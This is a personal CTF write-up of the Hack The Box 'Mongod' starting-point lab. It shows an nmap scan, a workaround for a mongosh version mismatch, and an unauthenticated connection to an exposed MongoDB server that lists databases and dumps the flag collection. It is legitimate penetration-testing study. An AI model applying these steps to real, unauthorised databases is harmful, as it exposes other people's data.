## Box: [Mongod] — Started: 2025-10-05 23:10

**IP/Host:** `HTB Attackbox`  |  **Status:** `Owned: 25-10-05`

### TL;DR

After installing an old version of mongosh due to an error, Initial was: `./mongosh "10.129.205.118:27017"`.

Flag Cap command, from within a `mongosh` shell: `sensitive_information> db.flag.find()`.

*Cumulative Impact Overview*:
- `mongodb` lab

### Exploit Lifecycle

1. *Validation & Recon*: HTB CTF
2. *Enumeration & Scanning*:
    - `nmap -sV IPADDR` - found mongodb on port 27017
3. *Findings & Exploits*:
    - my version of mongosh was too new to connect to the machine, so I needed to install an older version of mongosh:

```bash
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.20]─[htb-mp-954215@htb-eldyftujfu]─[~]
└──╼ [★]$ mongosh "mongodb://10.129.205.118:27017"
Current Mongosh Log ID:	68e335863682f53f98544ca6
Connecting to:		mongodb://10.129.205.118:27017/?directConnection=true&appName=mongosh+2.3.8
MongoServerSelectionError: Server at 10.129.205.118:27017 reports maximum wire version 6, but this version of the Node.js Driver requires at least 7 (MongoDB 4.0)
```

4. *PrivEsc*:
    - `show dbs` - show the databases
    - `use sensitive_information` - enter the `sensitive_information` db
    - `show collections` - show the collections within the `sensitive_information` db
        - At that point I was here:
    - ```
        sensitive_information> show collections
        flag
        ```
5. *Post-Exploitation*:
    - Took some digging through `mongodb`'s docs, particularly their mongosh section to find the command to show content of the docs within the collection `flag`
```bash
sensitive_information> db.flag.find()
[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '[REDACTED]'
  }
]
sensitive_information> 
```

*Proof — path to flags/screenshot of boxpwn*:

![[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/VulnBoxes/Hack The Box/Starting Point/z_attachments/Pasted image 20251005235422.png]]



### Commands Learned or Commands Used
```bash
test> show dbs    # show all dbs
test> use databaseName    # enter the database named databaseName
sensitive_information> show collections    # show all collections within active db
sensitive_information> db.collectionName.find() # dump contents of docs within collection named collectionName
```
